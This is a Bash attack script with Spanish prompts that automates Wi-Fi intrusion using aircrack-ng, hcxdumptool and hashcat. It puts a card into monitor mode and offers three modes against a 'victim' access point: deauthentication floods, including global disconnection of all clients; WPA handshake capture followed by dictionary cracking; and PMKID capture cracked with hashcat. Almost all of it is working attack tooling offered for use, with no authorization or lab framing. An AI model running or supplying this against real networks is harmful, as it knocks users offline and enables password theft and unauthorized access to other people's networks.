#!/usr/bin/bash

# Author: clhore

# Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

trap ctrl_c INT

function ctrl_c(){
	echo -e "\n${yellowColour}[*]${endColour}${grayColour}Saliendo${endColour}"
	tput cnorm; airmon-ng stop "${networkCard}mon" > /dev/null 2>&1
	exit 0
}

function dependencies(){
	tput civis
	clear; dependencies=(xterm aircrack-ng hcxdumptool hashcat)

	echo -ne "${yellowColour}[*]${endColour}${grayColour} Comprobando programas necesarios...${endColour}";
	echo -n = ;
	sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
	echo ""
	sleep 2

	for program in "${dependencies[@]}"; do
		echo -ne "\n${yellowColour}[*]${endColour}${blueColour} Herramienta${endColour}${purpleColour} $program${endColour}${blueColour}...${endColour}"

		test -f /usr/bin/$program

		if [ "$(echo $?)" == "0" ]; then
			echo -e " ${greenColour}(V)${endColour}"
		else
			echo -e " ${redColour}(X)${endColour}\n"
			echo -e "${yellowColour}[*]${endColour}${grayColour} Instalando herramienta ${endColour}${blueColour}$program${endColour}${yellowColour}...${endColour}"
			if [ "$systemUser" == "arch" ]; then
				pacman -S --noconfirm $program > /dev/null 2>&1

			elif [ "$systemUser" == "debian" ] || [ "$systemUser" == "ubuntu" ]; then
				apt-get install $program -y > /dev/null 2>&1
			else
				echo -e "${redColour}:: Error en la verificacion de tu sistema operativo${endColour}"
				ctrl_c	
			fi
		fi; sleep 1
	done
}

function interfaceModeMonitor(){
	clear; inface=$(ip address | cut -d ' ' -f 2 | xargs | tr ' ' '\n' | tr -d ':' > interface)
	sleep 1; echo -e "${yellowColour}LISTA DE INTERFACES DE RED:${endColour}"

	let count=0; for interface in $(cat interface); do
		echo -e "\t${yellowColour}${count}:${yellowColour} ${grayColour}$interface${grayColour}"; sleep 0.25
		let count++
	done

	checker=0; while [ $checker -ne 1 ]; do
		echo -en "${yellowColour}Network card (Ej: 1): ${endColour}" && read networkCardNum

		networkCardList=($(a=$(cat interface); echo $a)); networkCard="${networkCardList[${networkCardNum}]}"

		for interface in $(cat interface); do
			if [ "$networkCard" == "$interface" ]; then
				checker=1
			fi; sleep 0.5
		done
	done;rm interface

	sleep 0.25; echo -e "${readColour}::${endColour} ${grayColour}Configurando netword cart${endColour}"
	sleep 0.25; airmon-ng start $networkCard 1>/dev/null 2>&1
	ip addr list ${networkCard}mon 1>/dev/null 2>&1
	if [ "$(echo $?)" -eq "0" ]; then
		echo -e "${readColour}::${endColour} ${grayColour}Network cart modo monitor${endColour}"
		codeCheck=0
	else
		echo -e "${readColour}::Error${endColour}"
		codeCheck=1
	fi
}

function attackDeauth (){
	echo -en "\t${yellowColour}Conoces el [BSSID y CH] del AP victima(y/n): ${endColour}" && read opt

	if [ "$opt" == "n" ] || [ "$opt" == "N" ]; then
		xterm -hold -e "airodump-ng ${networkCard}mon" 2> /dev/null &
		xtermAirodumpPID=$!

		echo -en "\t${yellowColour}BSSID: ${endColour}" && read BSSID
		echo -en "\t${yellowColour}Channel: ${endColour}" && read CH
		sleep 1; kill -9 $xtermAirodumpPID; wait $xtermAirodumpPID 2>/dev/null
	else
		echo -en "\t${yellowColour}BSSID: ${endColour}" && read BSSID
		echo -en "\t${yellowColour}Channel: ${endColour}" && read CH
	fi

	xterm -hold -e "airodump-ng --bssid $BSSID --channel $CH --write /dev/null ${networkCard}mon" 2>/dev/null &
        xtermAirodump_AP_PID=$!; sleep 1

	echo -en "\t${yellowColour}De-autenticación GLOBAL(y/n): ${endColour}" && read mode

	if [ "$mode" == "y" ] || [ "$mode" == "Y" ]; then
		ST='FF:FF:FF:FF:FF:FF'
	else
		echo -en "\t${yellowColour}STATYON: ${endColour}" && read ST
	fi

	echo -en "\t${yellowColour}Mas opciones(y/n): ${endColour}" && read opt

	if [ "$opt" == "y" ] || [ "$opt" == "Y" ]; then
		echo -en "\t${yellowColour}Duracion (s): ${endColour}" && read numS; sleep 0.5
		echo -en "\t${yellowColour}Intervalo (s): ${endColour}" && read numSI; sleep 0.5
		echo -en "\t${yellowColour}Numero de veces: ${endColour}" && read num; sleep 0.5

    		for (( c=1; c<=$num; c++ ))
		do
			xterm -hold -e "aireplay-ng -0 0 -a $BSSID -c ${ST} ${networkCard}mon 2>/dev/null" 2>/dev/null &
			xtermAireplayPIB=$!
			sleep $numS; kill -9 $xtermAireplayPIB; wait $xtermAireplayPIB 2>/dev/null; sleep $numSI
		done; echo -en "\t${yellowColour} Salir o realizar otro attcack(stop/newAttack): ${endColour}" && read opt
	else
		xterm -hold -e "aireplay-ng -0 0 -a $BSSID -c ${ST} ${networkCard}mon 2>/dev/null" 2>/dev/null &
		xtermAireplayPIB=$!
		echo -en "\t${yellowColour}Parar attack o realizar otro attack(stop/newAttack/stopANDnew): ${endColour}" && read opt
	fi

	if [ "$opt" == "stop" ]; then
		sleep 0.5; echo -e "\t\t${readColour}::${endColour} ${grayColour}Kill attack${endColour}"
		sleep 0.5; kill -9 $xtermAirodump_AP_PID 2>/dev/null; wait $xtermAirodump_AP_PID 2>/dev/null
		sleep 0.5; kill -9 $xtermAireplayPIB 2>/dev/null; wait $xtermAireplayPIB 2>/dev/null
		sleep 0.5; echo -e "\t\t${readColour}::${endColour} ${grayColour}Attack stop${endColour}"
		sleep 0.5; ctrl_c
	elif [ "$opt" == "newAttack" ]; then
		clear
	elif [ "$opt" == "stopANDnew" ]; then
		sleep 0.5; echo -e "\t\t${readColour}::${endColour} ${grayColour}Kill attack${endColour}"
                sleep 0.5; kill -9 $xtermAirodump_AP_PID 2>/dev/null; wait $xtermAirodump_AP_PID 2>/dev/null
                sleep 0.5; kill -9 $xtermAireplayPIB 2>/dev/null; wait $xtermAireplayPIB 2>/dev/null
		sleep 0.5; echo -e "\t\t${readColour}::${endColour} ${grayColour}Attack stop${endColour}"
		sleep 0.5; clear
	else
		ctrl_c
	fi	

}

function attackHandshake(){
	xterm -hold -e "airodump-ng ${networkCard}mon" 2> /dev/null &
	xtermAirodumpPID=$!
	
	echo -en "\t${yellowColour}BSSID: ${endColour}" && read BSSID
	echo -en "\t${yellowColour}Channel: ${endColour}" && read CH
	sleep 1; kill -9 $xtermAirodumpPID; wait $xtermAirodumpPID 2>/dev/null 

	xterm -hold -e "airodump-ng --bssid $BSSID --channel $CH --write Captura ${networkCard}mon" 2>/dev/null &
	xtermAirodump_AP_PID=$!; sleep 1
	
	echo -en "\t${yellowColour}De-autenticación GLOBAL(y/n): ${endColour}" && read mode

	if [ "$mode" == "y" ] || [ "$mode" == "Y" ]; then	
		ST='FF:FF:FF:FF:FF:FF'
	else
		echo -en "\t${yellowColour}STATYON: ${endColour}" && read ST
	fi
	
	echo -en "\t${yellowColour}Duracion (s): ${endColour}" && read numS; sleep 0.5
	echo -en "\t${yellowColour}Intervalo (s): ${endColour}" && read numSI; sleep 0.5
	echo -en "\t${yellowColour}Numero de veces: ${endColour}" && read num; sleep 0.5

	for (( c=1; c<=$num; c++ ))
	do
		xterm -hold -e "aireplay-ng -0 10 -a $BSSID -c ${ST} ${networkCard}mon 2>/dev/null" 2>/dev/null &
        	xtermAireplayPID=$!
		sleep $numS; kill -9 $xtermAireplayPID; wait $xtermAireplayPID 2>/dev/null; sleep $numSI
	done

	sleep 20; kill -9 $xtermAirodump_AP_PID; wait $xtermAirodump_AP_PID 2>/dev/null
	echo -en "\t${yellowColour}Crack [Handshake](y/n): ${endColour}" && read mode
	echo -en "\t${yellowColour}Ruta diccionario: ${endColour}" && read ruteDic

	if [ "$mode" == "n" ] || [ "$mode" == "N" ]; then
                ctrl_c
	fi

	xterm -hold -e "aircrack-ng -w $ruteDic -b $BSSID  Captura-01.cap" 2>/dev/null &

	sleep 1; echo -en "\t${yellowColour}Eliminar captura(y/n): ${endColour}" && read capOPT
	sleep 1 

	if [ "$capOPT" == "y" ] || [ "$capOPT" == "Y" ]; then
		rm Captura* 2>/dev/null
		sleep 1; echo -e "\t\t${readColour}::${endColour} ${grayColour}Capturas borradas${endColour}"
		sleep 1; echo -e "\t\t${readColour}::${endColour} ${grayColour}Archivos temporales borrados${endColour}"
	fi
	sleep 1; ctrl_c
}

function attackPMKID(){
	echo -en "\t${yellowColour}Modo (auto/manual): ${endColour}" && read mode
	
	if [ "$mode" == "auto" ]; then 

		echo -ne "\t${yellowColour}Duracion del escaneo(s):${endColour}" && read scanTimeout
		echo -ne "\t${yellowColour}Comenzar escaneo [ENTER] ${endColour}" && read
		
		xterm -hold -e "hcxdumptool -i ${networkCard}mon --enable_status=1 -o Captura.pcapng" 2>/dev/null &
		xtermHcxdumptoolPID=$!

		sleep 0.5; echo -e "\t\t${readColour}::${endColour} ${grayColour}El escaneo durara ${scanTimeout}(s)${endColour}"
		sleep $scanTimeout; kill -9 $xtermHcxdumptoolPID; wait $xtermHcxdumptoolPID 2>/dev/null
	elif [ "$mode" == "manual" ];then
		echo -ne "\t${yellowColour}Comenzar escaneo [ENTER] ${endColour}" && read

		xterm -hold -e "hcxdumptool -i ${networkCard}mon --enable_status=1 -o Captura.pcapng" 2>/dev/null &
		xtermHcxdumptoolPID=$!
		
		sleep 1; echo -e "\t\t${readColour}::${endColour} ${grayColour}Escaneo en ejecucion${endColour}"
		echo -e "\t${yellowColour}Parrar escaneo [ENTER] ${endColour}" && read

		sleep 1; kill -9 $xtermHcxdumptoolPID; wait $xtermHcxdumptoolPID 2>/dev/null
	else
		ctrl_c
	fi
	
	echo -ne "\t${yellowColour}Crack by (aircrack/hashcat):${endColour}" && read crackMode
	echo -en "\t${yellowColour}Ruta diccionario: ${endColour}" && read ruteDic

	if [ "$crackMode" == "aircrack" ]; then
		tcpdump -r Captura.pcapng -w Captura.pcap
		aircrack-ng -w $ruteDic Captura.pcap
		
	elif [ "$crackMode" == "hashcat" ]; then

		hcxpcapngtool --pmkid=myHashes Captura.pcapng
	
		test -f myHashes

		if [ "$(echo $?)" == "0" ]; then
			hashcat -m 16800 $ruteDic myHashes -d 1 --force
		else
			ctrl_c
		fi
	else
		ctrl_c
	fi
}

function dicctionary(){
	echo -en "\${yellowColour}Ruta diccionario: ${endColour}" && read ruteDic

	let numLineas=$(wc $ruteDic | xargs | awk '{print $1}'); sleep 1
        let resto=$numLineas%2; mkdir .TMP 2>/dev/null

        if [ $resto -eq 0  ]; then
		let numReferi=2
        else
               	let numReferi=3
       	fi

     	let numPasswords=$numLineas/$numReferi; sleep 0.5
       	let count=$(echo $numPasswords); sleep 0.5 
	echo -e "\t\t${readColour}::${endColour} ${grayColour}Creando diccionarios en la carpeta .TMP${endColour}"
        for (( c=1; c<=$numReferi; c++ ))
        do
		echo -e "\t\t${readColour}::${endColour} ${grayColour}Creando dict${c}${endColour}"
                echo "$(head -n $count $ruteDic | tail -n $numPasswords)" > .TMP/dict${c}.txt; sleep 1
                let count+=$numPasswords
       done
}

function attack(){
	echo -ne "\n${yellowColour}[*] Modo de ataque (DEAUTH/HANDSHAKE/PMKID): ${endColour}" & read attackMode
	
	if [ "$attackMode" == "DEAUTH" ]; then
		attackDeauth 
	elif [ "$attackMode" == "HANDSHAKE" ]; then
		attackHandshake
	elif [ "$attackMode" == "PMKID" ]; then
		attackPMKID
	else
		echo -e "${redColour}:: Modo de ataque no valido${endColour}"
		ctrl_c
	fi
}

#echo "XTerm*selectToClipboard: true" > ~/.Xresources
#xrdb -merge ~/.Xresources

# main function
if [ "$(id -u)" == "0" ]; then
	declare -i counter=0; while getopts ":h:" arg; do
                case $arg in
                        h) helpPanel;;
                esac
	done

	echo -ne "${yellowColour}[*] Sistema operativo [arch/debian/ubuntu]: ${endColour}" & read systemUser
	sleep 1

	if [ "$systemUser" == "arch" ] || [ "$systemUser" == "debian" ] || [ "$systemUser" == "ubuntu" ]; then
		clear; dependencies;codeCheck=1
		while :
		do
			if [ "$codeCheck" == "1" ]; then interfaceModeMonitor; else attack; fi
		done
	else
		echo -e "${redColour}:: Error en la verificacion de tu sistema operativo${endColour}"
	fi
else
	echo -e "${redColour}Ejecute el script como root${endColour}"
fi
